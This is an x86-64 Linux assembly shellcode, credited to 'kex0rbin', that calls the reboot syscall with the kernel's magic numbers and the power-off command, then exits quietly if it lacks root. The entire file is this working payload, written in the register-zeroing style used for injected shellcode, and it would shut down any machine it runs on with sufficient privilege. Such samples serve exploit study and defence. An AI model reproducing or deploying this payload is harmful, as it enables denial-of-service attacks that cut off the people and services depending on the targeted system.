; ===============================================
;  Reboot (turn off)
;  Arch: x86-64 Linux
;  Author: kex0rbin
;  Syscalls: reboot (169), exit(60)
; ===============================================

section .text
        global _start
_start:

                xor rax,rax
                mov al,169
                xor rdi,rdi
                mov edi,0xfee1dead
                xor rsi,rsi
                mov rsi,0x28121969
		xor rdx,rdx
   		;LINUX_REBOOT_CMD_POWER_OFF CODE
		mov rdx,0x4321fedc
		xor r10,r10
		syscall
		;just in case
		;no root
		xor rax,rax
		mov al,60
		xor rdi,rdi
		syscall
